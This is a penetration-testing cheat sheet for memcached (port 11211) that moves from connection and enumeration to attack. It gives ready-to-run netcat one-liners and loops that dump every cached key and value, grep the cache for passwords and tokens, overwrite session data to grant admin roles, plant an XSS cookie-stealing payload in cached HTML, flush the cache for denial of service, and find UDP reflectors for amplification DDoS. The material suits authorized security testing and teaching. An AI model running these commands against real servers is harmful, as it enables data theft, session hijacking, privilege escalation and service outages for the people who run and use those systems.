# Memcached

**`Default Port: 11211`**

**Memcached** is a high-performance, distributed memory caching system designed to speed up dynamic web applications by alleviating database load. It stores data in RAM as key-value pairs for quick retrieval. While primarily used for caching, memcached can store session data, API responses, and other temporary information. Misconfigured memcached instances can expose sensitive data and be exploited for denial of service or data manipulation.

### Connect <a href="#connect" id="connect"></a>

#### Using telnet <a href="#using-telnet" id="using-telnet"></a>

You can use telnet to connect to memcached and send commands directly to manage cached data:

```
# Connect to memcached
telnet target.com 11211

# Basic commands
stats
stats items
stats slabs
get key_name
quit
```

#### Using netcat <a href="#using-netcat" id="using-netcat"></a>

```
# Connect with netcat
nc target.com 11211

# Send commands
echo "stats" | nc target.com 11211
echo "version" | nc target.com 11211
```

#### Using memcached Client (Python) <a href="#using-memcached-client-python" id="using-memcached-client-python"></a>

```
import memcache

# Connect to memcached
mc = memcache.Client(['target.com:11211'])

# Get value
value = mc.get('key')
print(value)

# Set value
mc.set('key', 'value')

# Get stats
stats = mc.get_stats()
print(stats)
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect memcached services and check if they're exposed without authentication.

```
nmap -p 11211 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Identify memcached server version and gather configuration details.

**Using netcat**

```
# Using netcat
echo "version" | nc target.com 11211
```

**Using telnet**

```
# Using telnet
telnet target.com 11211
version
```

**Using nmap**

```
# Using nmap
nmap -p 11211 -sV target.com
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Statistics Gathering <a href="#statistics-gathering" id="statistics-gathering"></a>

Memcached provides detailed statistics through various commands that can reveal system information, cache usage, and stored key patterns.

```
# Get general stats
echo "stats" | nc target.com 11211

# Get item stats (shows slabs with data)
echo "stats items" | nc target.com 11211

# Get slab stats
echo "stats slabs" | nc target.com 11211

# Get settings
echo "stats settings" | nc target.com 11211

# Get sizes
echo "stats sizes" | nc target.com 11211
```

#### Key Enumeration <a href="#key-enumeration" id="key-enumeration"></a>

Extracting cached keys allows you to identify and retrieve sensitive data stored in memcached.

**Manual Key Extraction**

```
# List slabs with items
echo "stats items" | nc target.com 11211

# Dump keys from slab (e.g., slab 1, limit 100)
echo "stats cachedump 1 100" | nc target.com 11211

# Get specific key
echo "get key_name" | nc target.com 11211
```

**Automated Key Extraction**

```
# Automate key extraction
for slab in {1..30}; do
  echo "stats cachedump $slab 100" | nc target.com 11211
done
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### No Authentication <a href="#no-authentication" id="no-authentication"></a>

Memcached by default has no authentication mechanism, making it trivial to access and manipulate cached data if exposed.

```
# Test access
echo "version" | nc target.com 11211

# If version returns, memcached is accessible
# Enumerate and extract all data
```

#### Data Extraction <a href="#data-extraction" id="data-extraction"></a>

Extracting all cached data requires iterating through slabs and dumping their keys and values.

```
# Extract all keys and values
# Step 1: Get slabs
slabs=$(echo "stats items" | nc target.com 11211 | grep "items:" | cut -d: -f2 | sort -u)

# Step 2: Dump each slab
for slab in $slabs; do
  echo "stats cachedump $slab 1000" | nc target.com 11211
done > keys.txt

# Step 3: Extract values
cat keys.txt | grep "ITEM" | awk '{print $2}' | while read key; do
  echo "get $key" | nc target.com 11211
done
```

#### Data Manipulation <a href="#data-manipulation" id="data-manipulation"></a>

You can modify cached data to alter application behavior, escalate privileges, or inject malicious content.

**Basic Data Manipulation**

```
# Modify cached data
echo -e "set session_admin 0 0 4\r\ntest" | nc target.com 11211

# Delete keys
echo "delete key_name" | nc target.com 11211

# Flush all data (DoS)
echo "flush_all" | nc target.com 11211
```

**Session Data Manipulation**

```
# Modify session data
# If application uses memcached for sessions
echo -e "set user_12345_session 0 0 20\r\n{\"admin\":true}" | nc target.com 11211
```

#### Session Hijacking <a href="#session-hijacking" id="session-hijacking"></a>

Applications often store session data in memcached, allowing you to steal or manipulate user sessions.

**Finding and Extracting Sessions**

```
# Find session keys
echo "stats items" | nc target.com 11211 | grep session

# Get session data
echo "get sess_abc123" | nc target.com 11211
```

**Session Privilege Escalation**

```
# Modify session to elevate privileges
echo -e "set sess_abc123 0 0 25\r\n{\"role\":\"administrator\"}" | nc target.com 11211
```

#### Amplification DDoS <a href="#amplification-ddos" id="amplification-ddos"></a>

Memcached can be abused for UDP amplification attacks.

```
# Memcached responds with large stats output to small request
# Can amplify attack by 10,000x - 51,000x

# Check if UDP is enabled
nmap -sU -p 11211 target.com

# If open, it can be abused as DDoS reflector
# (Don't do this without permission)
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Credential Harvesting <a href="#credential-harvesting" id="credential-harvesting"></a>

Search for sensitive credentials stored in memcached cache.

**Automated Credential Search**

```
# Search for credentials in cache
echo "stats cachedump 1 1000" | nc target.com 11211 | while read line; do
  key=$(echo $line | awk '{print $2}')
  echo "get $key" | nc target.com 11211 | grep -i "password\|secret\|token"
done
```

**Common Credential Keys**

```
# Common cached credential keys
get api_key
get database_password
get admin_token
get jwt_secret
```

#### Cache Poisoning <a href="#cache-poisoning" id="cache-poisoning"></a>

Inject malicious data into memcached cache to compromise application behavior.

**User Profile Poisoning**

```
# Poison cache with malicious data
# If application caches user profiles
echo -e "set user_profile_123 0 0 50\r\n{\"username\":\"admin\",\"role\":\"superadmin\"}" | nc target.com 11211
```

**HTML Content Poisoning**

```
# Poison cached HTML
echo -e "set page_home 0 0 50\r\n<script>alert(document.cookie)</script>" | nc target.com 11211
```

### Common Memcached Commands <a href="#common-memcached-commands" id="common-memcached-commands"></a>

| Command           | Description      | Usage                   |
| ----------------- | ---------------- | ----------------------- |
| `stats`           | Get statistics   | `stats`                 |
| `stats items`     | Get slab stats   | `stats items`           |
| `stats cachedump` | Dump keys        | `stats cachedump 1 100` |
| `get`             | Get value        | `get key_name`          |
| `set`             | Set value        | `set key 0 0 5`         |
| `delete`          | Delete key       | `delete key_name`       |
| `flush_all`       | Delete all       | `flush_all`             |
| `version`         | Get version      | `version`               |
| `quit`            | Close connection | `quit`                  |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool               | Description            | Primary Use Case   |
| ------------------ | ---------------------- | ------------------ |
| telnet             | Terminal client        | Manual testing     |
| netcat             | Network utility        | Connection testing |
| memcached-tool     | Official tool          | Management         |
| libmemcached-tools | Command-line tools     | Testing and debug  |
| Nmap               | Network scanner        | Service detection  |
| Metasploit         | Exploitation framework | Automated testing  |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ No authentication
* ❌ Exposed to internet (0.0.0.0)
* ❌ UDP protocol enabled (DDoS risk)
* ❌ No firewall restrictions
* ❌ Sensitive data cached
* ❌ Session data in cleartext
* ❌ No encryption
* ❌ Default port accessible
* ❌ No access logging
* ❌ Large memory allocation (DDoS target)

<br>
